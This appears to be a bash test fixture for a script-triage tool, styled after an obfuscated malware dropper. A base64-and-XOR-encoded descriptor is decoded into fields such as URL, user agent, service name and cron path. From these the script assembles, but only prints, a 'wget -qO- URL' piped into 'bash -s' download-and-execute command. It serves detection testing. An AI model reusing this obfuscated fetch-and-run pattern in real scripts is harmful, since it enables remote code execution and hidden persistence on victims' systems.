#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_ee550e3f='ki1OfxCQdQ9wXoVzDnYKlnUgcQaJfwtmT4B5DHMCkHMXXBONYBp/AoBxD3cGli0IZ''AaQTwx3B4tlC1wTjWAafxCQcRhmPId/Cm0X2SEDYAKJYB5qBIpPFmdeh3EScwKNdx''EuBtYgSTNQh3ZMOx+RYhM+C5BkD3BZyz8aMVPSIExgBdcoUWYbhX0PbwbKeRF1Aoh''5GyxS1HFGMQXTJ1FwC5hlDGYRu3EYZg2QLTd2DZBiGnAQqHEdLAbWIEkzUId2TDs='
readonly Codec_ee550e3f='base64_chunks|repeating_key_xor|e4,10,7f,03,63'

Load_ee550e3f() {
  EnCoDeD_Bytes=()
  local PaRt
  while read -r PaRt; do [[ -n "$PaRt" ]] && EnCoDeD_Bytes+=("$PaRt"); done < <(printf '%s' "${Material_ee550e3f}" | base64 --decode | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d')
}

Decode_ee550e3f() {
  DeCoDeD_Bytes=()
  local -a key_bytes=(228 16 127 3 99)
  local InDeX
  for ((InDeX=0; InDeX<${#EnCoDeD_Bytes[@]}; InDeX++)); do
    DeCoDeD_Bytes+=("$((EnCoDeD_Bytes[InDeX] ^ key_bytes[InDeX % ${#key_bytes[@]}]))")
  done
}

Recover_ee550e3f() {
  local -a EnCoDeD_Bytes DeCoDeD_Bytes
  local DeScRiPtOr_Text NeUtRaL PaSs InDeX
  local -a series=(3 5 8 13); NeUtRaL="${series[*]:1:2}"
  Load_ee550e3f
  case 1 in 1) Decode_ee550e3f ;; *) return 70 ;; esac
  DeScRiPtOr_Text=''
  local octal character
  for InDeX in "${!DeCoDeD_Bytes[@]}"; do
    printf -v octal '%03o' "${DeCoDeD_Bytes[InDeX]}"
    printf -v character '%b' "\\$octal"
    DeScRiPtOr_Text+="$character"
  done
  printf '%s\n' "$DeScRiPtOr_Text"
}

Inspect_ee550e3f() { local recovered; recovered="$(Recover_ee550e3f)"; printf '%s\n' "$recovered"; }

Plan_ee550e3f() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_ee550e3f)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a request_command=(wget -qO- "$url")
  local -a interpreter=(bash -s)
  declare -p request_command interpreter
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_ee550e3f; fi
